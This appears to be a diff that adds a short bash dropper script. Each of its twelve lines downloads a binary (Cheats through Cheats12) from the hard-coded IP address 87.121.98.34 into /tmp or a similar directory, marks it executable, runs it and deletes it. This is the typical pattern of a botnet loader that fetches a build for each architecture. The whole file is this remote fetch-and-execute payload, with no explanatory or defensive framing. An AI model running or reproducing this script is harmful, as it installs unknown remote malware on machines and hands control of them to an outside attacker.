@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats; chmod +x Cheats; ./Cheats; rm -rf Cheats
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats2; chmod +x Cheats2; ./Cheats2; rm -rf Cheats2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats3; chmod +x Cheats3; ./Cheats3; rm -rf Cheats3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats4; chmod +x Cheats4; ./Cheats4; rm -rf Cheats4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats5; chmod +x Cheats5; ./Cheats5; rm -rf Cheats5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats6; chmod +x Cheats6; ./Cheats6; rm -rf Cheats6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats7; chmod +x Cheats7; ./Cheats7; rm -rf Cheats7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats8; chmod +x Cheats8; ./Cheats8; rm -rf Cheats8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats9; chmod +x Cheats9; ./Cheats9; rm -rf Cheats9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats10; chmod +x Cheats10; ./Cheats10; rm -rf Cheats10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats11; chmod +x Cheats11; ./Cheats11; rm -rf Cheats11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/Cheats12; chmod +x Cheats12; ./Cheats12; rm -rf Cheats12
